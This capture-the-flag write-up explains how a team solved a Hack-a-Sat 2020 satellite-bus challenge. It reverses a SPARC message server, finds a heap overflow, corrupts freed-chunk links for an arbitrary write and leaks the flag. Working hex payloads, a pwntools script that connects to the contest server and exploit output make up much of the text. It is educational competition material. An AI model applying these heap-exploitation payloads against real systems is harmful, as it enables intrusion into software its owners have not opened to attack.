Hackasat Qualifier 2020: Sun? On my Sat? Again?
===============================================

* **Category:** Satellite Bus
* **Points:** 436
* **Solves:** 0 
* **Description:** 

> 
> 		
> 		"After heaps of code reviews, I'm sure nobody can get to this flag, it's not even referenced by the code!"
> 
>  		You'll need these files to solve the challenge.
> 			https://static.2020.hackasat.com/366dcd4056f32c29a251ea65933d751466857670/challenge.zip

_Write-up by Solar Wine team_

Introduction
------------

This was the last and hardest challenge of the ``"Satellite Bus"``category and was never solved by any team. It took me a good ~20 hours (sprinkled over 15 days) to crack it, which is why we ignored it in the first place during the quals.


This challenge is the follow up of ``"Sun? On my Sat?"`` and should be studied side-by-side.

```console
$ file  file challenge.elf
challenge.elf: ELF 32-bit MSB executable, SPARC, version 1 (SYSV), statically linked, stripped
```

No surprise here, it's still a ``SPARC`` binary. However unlike the previous challenge, this binary is stripped so not debug symbols. 
That's when the ``"Sun? On my Sat?"`` binary is useful since we can "port" some symbols from it to our new binary (``read``, ``puts``, ``exit``, ``memcpy``, etc.).

This executable also implements a message processing server:

```C
void Init()
{
  int status;

  puts("Mission Server: Running");
  while( true ) {
    
    status = __ensure_gCopyBuffer_is_mallocated();
    if (status != 0) {
      puts("Bad Mission Plan, Goodbye");
      goto EXIT;
    }
    
    status = MsgHandler();
    if (status != 0) {
      break;
    }

    status = __compute_crc_on_gCopyBuffer_content();
    if (status != 0) {
      puts("Bad Mission Plan, Goodbye");
EXIT:
      exit(0);
    }
  }
  printf("Goodbye: %s %d\n","Error",status);
  goto EXIT;
}
```

And the message handler:
```C
typedef struct _MAGIC {
  uint8_t must_be_eight;
  uint8_t must_be_one;
} MAGIC;

typedef struct _HEADER {
  uint16_t must_be_DEAD;
  uint16_t must_be_BEEF;
  uint16_t msg_id;
  uint16_t msg_length;
} HEADER;


typedef struct _PACKET_HEADER {
  uint8_t length;
  uint8_t cmd_id;
} PACKET_HEADER;

dword MsgHandler(void)
{

  HEADER *header;
  MAGIC *magic;
  PACKET_HEADER *pkt_header;
  void *pkt_data; // it's a union, really

  byte message_length;
  char bytes_read;
  char bytes_read_also;
  byte total_bytes_read;


  dword status = 0;

  // overmalloc'ing, but who cares ?
  header = (HEADER *)malloc(0x40);

  // Read MAGIC \x08\x01
  magic = (MAGIC *)malloc(2);
  bytes_read = readMsg(magic,2);
  if ((magic->must_be_eight == 8) && (magic->must_be_one == 1)) {

    // Read HEADER \xDE\xAD\xBE\xEF + msg_id + len(message)
    bytes_read_also = readMsg(header,8);
    total_bytes_read = bytes_read + bytes_read_also;

    // check messages received are incrementally increasing
    if (_g_LastMsgId < header->msg_id) {
      if (header->must_be_DEAD == 0xDEAD) {
        if (header->must_be_BEEF == 0xBEEF) {

          _g_LastMsgId = header->msg_id;
          message_length = header->message_length;
          free(header);

          // deserialize command packets and process them
          do {

            // no more data to read
            if (message_length <= total_bytes_read) {
              break;
            }

            // PACKET_HEADER and malloc for reading data as well
            bytes_read = readMsg(pkt_header,2);
            pkt_data = malloc(pkt_header->length);

            bytes_read_also = readMsg(pkt_data, pkt_header->length - 2);
            total_bytes_read = total_bytes_read + bytes_read + bytes_read_also;

            switch(pkt_header->cmd_id) {
            default:
              status = 7;
              break;
            case 2:
              status = getInfo(pkt_data, pkt_header->length);
              break;
            case 3:
              status = printValue(pkt_data, pkt_header->length);
              break;
            case 4:
              status = setValue(pkt_data, pkt_header->length);
              break;
            case 5:
              status = readBufferValue(pkt_data, pkt_header->length);
              break;
            case 6:
              status = CopyPktTogCopyBuffer(pkt_data, pkt_header->length);
            }
            free(pkt_data);

          } while (status == 0);


          if (pkt_header != NULL) {
            free(pkt_header);
          }

          if (status == 0) {
            puts("ACK");
          }
          else {
            printf("ERROR %d\n",status);
          }
        }
        else {
          status = 4;
        }
      }
      else {
        status = 3;
      }
    }
    else {
      status = 2;
    }
  }
  else {
    status = 5;
  }

  return status;
}
```

This is more complicated than the last challenge, but the protocol is roughly the same (they even removed that pesky crc8 computation), the big change - foreshadowed in the chall's description - is that messages are received in malloc'ed buffers instead of local stack variables.

We have 5 "commands" available:

* **``getInfo``**: kinda the same as the one in the last challenge, except they removed the ``ClipStrIdx`` function with the uninitialized var vulnerability
* **``printValue``**/**``setValue``**: get/set function target a global array ``uint8_t __g_DataStore[8]`` located in the ``.data`` segment.
* **``readBufferValue``**: returns the second value in the ``pkt_data`` we send. Not really interesting
* **``CopyPktTogCopyBuffer``**: copies some data from our ``pkt_data`` buffer to a heap buffer via ``memcpy``.

Market for lemons
-----------------

Before we take a look at that appealing ``memcpy`` call, let's just quickly review **``getInfo``**:

```c
typedef struct _GET_INFO_PACKET {
  uint8_t reserved[2];
  uint8_t str_index;
} GET_INFO_PACKET;

int getInfo(uint8_t *data, uint8_t data_len)
{
  int status;
  int str_index;

  if (data_len == 0x03) {

    str_index = ((GET_INFO_PACKET*) data)->str_index;

    if (str_index < 10) {
      puts((&g_getInfoMessages)[str_index]);
    }
    else {
      puts(g_aLalalalalalala);
    }

    status = 0;
  }
  else {
    status = 6;
  }

  return status;
}
```

We understand that, we give an index and it will spit out an info message from this string array:

```
.data:4001E418 40 01 C2 38        g_getInfoMessages:   .word aSpaceMessageBr   ! "Space Message Broker v3.2"
.data:4001E41C 40 01 C2 58                             .word aL54801255111     ! "L54-8012-5511-1"
.data:4001E420 40 01 C2 68                             .word aSparcRtemsGcc    ! "sparc-rtems-gcc"
.data:4001E424 40 01 C2 78                             .word aRtems5Dev        ! "rtems5-dev"
.data:4001E428 40 01 C2 88                             .word aStopReadingThi   ! "Stop Reading This list of Strings"
.data:4001E42C 40 01 C2 B0                             .word aItIsAWasteOfTi   ! "It is a waste of time..."
.data:4001E430 40 01 C2 D0                             .word aNoSeriously      ! "No, Seriously"
.data:4001E434 40 01 C2 E0                             .word aOkWhateverIMNo   ! "OK whatever, I'm not listening anymore"
.data:4001E438 40 01 C3 08                             .word aLalalalalalala   ! "LALALALALALALALALA"
.data:4001E43C 00 00 00 2A 00 00 00 07+__g_DataStore:  .word 0x2A, 7, 8, 0xA, 0x7A69
```

We have a string array with 9 elements in it, however GET_INFO_PACKET.str_index can have any values between 0 and 9, which means we have - you name it - an off-by-one vulnerability.

What is located at the 10-th element? ``__g_DataStore``, the data store we can control via **``printValue``**/**``setValue``**! How convenient is that?

Simply use **``setValue``** to write into ``__g_DataStore`` first 4 bytes the address where is located the flag and use **``getInfo(9)``** to print it out. Just easy as that.

Well not because of this:

```C
header_bytes_len = readMsg(pkt_header,2);
pkt_data = malloc(pkt_header->length);
data_bytes_len = readMsg(pkt_data, pkt_header->length - 2);

// [...]

status = getInfo(pkt_data, pkt_header->length);
```

In order to trigger the off-by-one, ``pkt_header->length`` must be equal to 3. However, in this case ``pkt_data`` is a 3-bytes buffer allocated but  ``readMsg`` only allows to set ``1`` byte! This means we can't control the value over ``((GET_INFO_PACKET*) data)->str_index`` and can't trigger the off-by-one. And this is not the only command handler which is broken, all the other are the same: we can't control **``printValue``**/**``setValue``** index and value to set, and **``readBufferValue``** is actually a OOB read. 

Unintended bug or massive trolling from the author of this chall? We might never know.

House of ******
---------------

Since this is a dead end, let's review **``CopyPktTogCopyBuffer``**:


```C
typedef struct _COPY_DATA_PACKET {
  uint8_t len_to_copy;
  uint8_t offset;
  uint8_t payload[]; // variable length array
} COPY_DATA_PACKET;


int CopyPktTogCopyBuffer(uint8_t *data, uint8_t data_len)
{
  int status;

  if (data_len < sizeof(COPY_DATA_PACKET)) {
    status = 6;
  }
  else {
    COPY_DATA_PACKET *cdp = (COPY_DATA_PACKET*) data;
    
    __memcpy(
      gCopyBuffer + cdp->offset,
      cdp->payload,
      cdp->len_to_copy
    );

    status = 0;
  }

  return status;
}
```

Unlike the other APIs, this one does not have the same broken design and works as intended.

This is pretty straightforward: this is a blatant heap buffer overflow where we control the data to copy to, the length to copy, and the offset from ``gCopyBuffer``. ``gCopyBuffer`` is a 0x20 bytes heap buffer allocated in ``Init`` so we have pretty much control over the whole heap space, however we don't know where the heap is allocated nor how it's implemented.

``g_getInfoMessages`` references the following strings ``"sparc-rtems-gcc"`` and ``"rtems5-dev"`` so I tried to looked at [the source code](https://github.com/RTEMS/gnu-mirror-gcc) for hints on how ``malloc`` and ``free`` are implemented. But it seems they ripped out the rtems code and put their own implementation.

I have to admit, I wasn't excited reversing a heap allocator implementation in SPARC (even with decompiler available). However, by just playing with ``malloc`` and ``free`` and dumping the heap space, I managed to notice a traditional glibc's ``chunk`` structure:

```C
struct malloc_chunk {
/* -0x08 */  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
/* -0x04 */  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
  
             union {
                  struct {
/*  0x00 */  		uint8_t data[];
                  } if_allocated;

                  struct {
/*  0x00 */  		struct malloc_chunk* fd;                /* double links -- used only if free. */
/*  0x04 */  		struct malloc_chunk* bk;
                  } if_freed;	
              }
};
```

Fortunately, [there is a treasure trove of links on the Internet of people exploiting the linux heap](https://heap-exploitation.dhavalkapil.com). However I'm not a Linux guy myself so I had to educate myself on the subject:

![cue training montage](montage.png)

(source: [https://www.youtube.com/watch?v=8I_5Bw1U4s4](https://www.youtube.com/watch?v=8I_5Bw1U4s4))


Exploitation
---------------

Initially I tried the traditional path of shrinking a chunk in order overlay a newly mallocated chunk with a previous chunk. That way I would be able to trigger the initial off-by-one vulnerability with data I control. Life didn't went this way.

While playing with freed chunks, I realized I could overwrite ``fd`` and ``bk`` of a freed chunk and trigger an arbitrary write when mallocating the freed chunk. But what can I rewrite? I don't know where the heap is located, but I know where the binary is!

The plan is pretty straightforward from then on: 

1) overwrite the ``fd`` and ``bk`` of the next freed chunk in the free list (pretty easy to locate since the allocator is linear)
2) overwrite own chunk ``mchunk_size`` and set bit 31 to 1 in order to "tag" it as freed.
3) the next malloc rewrite ``g_getInfoMessages[0]`` and set our ``bk`` address in it, which points to the string flag located in the ``.data`` section.
2) call **``getInfo``** in order to put out the flag in the console \o/

```console
$ python3 sparc_emulator_sun_sat_again.py --input "0801deadbeef000100250c0608204001e40c4001bf900c06080e0000004080000040030241"
(debug) puts @4001c028
puts(Mission Server: Running)
memcpy(0xcaca0088, 0xcaca004a, 0x8) # overwrite next freed's fd and bk
memcpy(0xcaca0040, 0xcaca004a, 0x8) # tag it as freed in order to fuck up the free list double links.
getInfo(len:0x3, index:0x0)
(debug) puts @4001bf90				# .text:4001BF90 .ascii "FLAG{No, It's not in the firmwar ..."
puts(FLAG{No,)
(debug) puts @4001c230
puts(ACK)
read(2) =
```

OK we can retrieve the first 8 bytes of the flags, the rest is cut off since the arbitrary write also write a NULL pointer at the address ``@4001bf98``. Well that's not a problem, we can't iterate over the flag 8 bytes by 8 bytes:

```python
import pwn

TICKET=b'ticket{sierra22284quebec:GADK33s7y7BILVOHJHlN0pRGveWXISkv3TOdO-QNC6klCrtXQ8l5VFqAH2yqLCbELg}'

def ticket(p):
  p.recvuntil(b'Ticket please:')
  p.sendline(TICKET)
  # print("Ticket sent.")


if __name__ == '__main__':


  inputs = [
    "0801deadbeef000100250c0608204001e40c4001bf900c06080e0000004080000040030241",     # 1 
    "0801deadbeef000200250c0608204001e40c4001bf980c06080e0000004080000040030241",     # 2 
    "0801deadbeef000300250c0608204001e40c4001bfa00c06080e0000004080000040030241",     # 3 
    "0801deadbeef000400250c0608204001e40c4001bfa80c06080e0000004080000040030241",     # 4 
    "0801deadbeef000500250c0608204001e40c4001bfb00c06080e0000004080000040030241",     # 5 
    "0801deadbeef000600250c0608204001e40c4001bfb80c06080e0000004080000040030241",     # 6 
    "0801deadbeef000700250c0608204001e40c4001bfc00c06080e0000004080000040030241",     # 7 
    "0801deadbeef000800250c0608204001e40c4001bfc80c06080e0000004080000040030241",     # 8 
    "0801deadbeef000900250c0608204001e40c4001bfd00c06080e0000004080000040030241",     # 9 
    "0801deadbeef000a00250c0608204001e40c4001bfd80c06080e0000004080000040030241",    # 10
    "0801deadbeef000b00250c0608204001e40c4001bfe00c06080e0000004080000040030241",    # 11
    "0801deadbeef000c00250c0608204001e40c4001bfe80c06080e0000004080000040030241",    # 12
    "0801deadbeef000d00250c0608204001e40c4001bff00c06080e0000004080000040030241",    # 13
    "0801deadbeef000e00250c0608204001e40c4001bff80c06080e0000004080000040030241",    # 14
    "0801deadbeef000f00250c0608204001e40c4001c0000c06080e0000004080000040030241",    # 15
    "0801deadbeef001000250c0608204001e40c4001c0080c06080e0000004080000040030241",    # 16
    "0801deadbeef001100250c0608204001e40c4001c0100c06080e0000004080000040030241",    # 17
    "0801deadbeef001200250c0608204001e40c4001c0180c06080e0000004080000040030241",    # 18
    "0801deadbeef001300250c0608204001e40c4001c0200c06080e0000004080000040030241",    # 19
  ]

  # remove pwntools output
  pwn.context.log_level = 'error'
  
  flag = b""
  for input_msg in inputs:
    
    p = pwn.remote("sunagain.satellitesabove.me", 5045)
    ticket(p)
    
    # send our input
    p.recvline()
    p.recvline()
    p.send("%s\n" % input_msg)

    # decode partial flag
    partial_flag = p.recvline()
    partial_flag = partial_flag.rstrip(b'\r\n')
    print(partial_flag)

    p.close()
    
  
  print("final flag {}".format(flag))
```

```console
$ python bf_flag_for_sun_sat_again.py
b'flag{sie'
b'rra22284'
b'quebec:G'
b'PzI0dVjo'
b'rFhUONdq'
b'Q6slvaj3'
b'4oaAFLiK'
b'f__zjAU0'
b'_FiBn1tT'
b'C595org4'
b'ujMkuaDF'
b'9uIDFaPn'
b'WG5xE5ts'
b'cjr4no}'
b''
b''
b''
b''
b''
final flag b'flag{sierra22284quebec:GPzI0dVjorFhUONdqQ6slvaj34oaAFLiKf__zjAU0_FiBn1tTC595org4ujMkuaDF9uIDFaPnWG5xE5tscjr4no}'
```

However when trying this flag, it would be spit out as incorrect. And also by relaunching the script I would get a different flag. I'm pretty sure the flag changes each time you request the remote service, which is a pretty neat anti-cheat measure: you can't just share the flag between teams, you also need to share tickets and the script to solve the challenge. 

Where's that leaves us? Well that mean we must find a way to spit out the whole flag in a single session. By fiddling some more with the heap, I finally noticed that if you trigger twice the same arbitrary read, the second time will overwrite our unfortunate NULL byte with the address of the last freed chunk and allow us to read the whole flag:

```console
$ python3 sparc_emulator_sun_sat_again.py --input "0801deadbeef000100250c0608204001e40c4001bf900c06080e00000040800000400302410801deadbeef000200250c0608204001e40c4001bf900c06080e0000004080000040030241"
(debug) puts @4001c028
puts(Mission Server: Running)
memcpy(0xcaca0088, 0xcaca004a, 0x8)
memcpy(0xcaca0040, 0xcaca004a, 0x8)
getInfo(len:0x3, index:0x0)
(debug) puts @4001bf90
puts(FLAG{No,)
(debug) puts @4001c230
puts(ACK)
memcpy(0xcaca0088, 0xcaca008a, 0x8)
memcpy(0xcaca0040, 0xcaca008a, 0x8)
getInfo(len:0x3, index:0x0)
(debug) puts @4001bf90
puts(FLAG{No,ÊÊ@s not in the firmware, that would have been too easy. But in the patched version it will be located here, so good that should help...?})
(debug) puts @4001c230
puts(ACK)
read(2) =
```

And using the real target:


```console
$ python solution.py
[+] Opening connection to 18.191.97.64 on port 5045: Done
Ticket sent.
b'Mission Server: Running\r\n'
Sending : 0801deadbeef000100250c0608204001e40c4001bf900c06080e00000040800000400302410801deadbeef000200250c0608204001e40c4001bf880c06080e0000004080000040030241
b'flag{sie\r\n'
b'ACK\r\n'
b'flag{sieC\xef\xf0\x802284quebec:GNJSp4Qk-377do7m_cVDwGLtmrtLbBvBSWLGSJnx7mysPP6Z-aN-8Qx3kuh4hYOHEYHR4UP24hODyEcitDpHpPM}\r\n'
b'ACK\r\n'
```

We can notice our flag is a bit "garbled" since there is an address ``"C\xef\xf0\x80"`` written in it, but it's in a fixed part of the flag (it always starts with "flag{sierra22284quebec:" in our case) so we can correct it and solve the challenge.
